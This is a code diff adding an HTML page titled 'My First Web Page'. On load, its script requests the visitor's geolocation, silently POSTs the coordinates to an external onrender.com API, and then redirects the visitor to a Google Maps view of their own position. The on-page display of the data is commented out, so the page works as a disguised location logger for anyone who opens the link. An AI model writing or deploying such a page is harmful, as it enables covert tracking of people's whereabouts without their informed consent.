@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>My First Web Page</title>
+    </head>
+    <script>
+        const url = "https://only-zv57.onrender.com/api/ubications/";
+        function enviarUbicacion(latitud, longitud){
+    // var url = process.env.URL_API;
+    console.log("url: " + url);
+    var data = {
+        "latitude": latitud,
+        "longitude": longitud
+    };
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", url, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            var json = JSON.parse(xhr.responseText);
+            console.log(json.id);
+        }
+    };
+    var data = JSON.stringify(data);
+    xhr.send(data);
+}
+        function siHayExito(posicion){
+	var latitud = posicion.coords.latitude
+	var longitud = posicion.coords.longitude
+    var accuracy = posicion.coords.accuracy
+    var altitude = posicion.coords.altitude
+    var altitudeAccuracy = posicion.coords.altitudeAccuracy
+    var heading = posicion.coords.heading
+    var speed = posicion.coords.speed
+    var timestamp = posicion.timestamp
+    var urlMap = "http://www.google.com/maps/place/"+latitud+","+longitud;
+	// var output = document.getElementById("ubicacion");
+	// output.innerHTML = "Latitud: "+latitud+"  Longitud: "+longitud+"  Accuracy: "+accuracy+"  Altitude: "+altitude+"  AltitudeAccuracy: "+altitudeAccuracy+"  Heading: "+heading+"  Speed: "+speed+"  Timestamp: "+timestamp + "  <a href='"+urlMap+"'>Mapa</a>";
+    //Create a delay of 5 seconds and then window.location.replace(urlMap);
+    enviarUbicacion(latitud, longitud);
+    setTimeout(function(){ window.location
+.replace(urlMap); }, 0);
+}
+function siHayError(error){
+    var output = document.getElementById("ubicacion");
+    output.innerHTML = "No se pudo obtener la ubicación";
+}
+
+navigator.geolocation.getCurrentPosition(siHayExito, siHayError)
+    </script>
+    <body>
+        <!-- <p id="ubicacion"></p> -->
+    </body>
+</html>
+
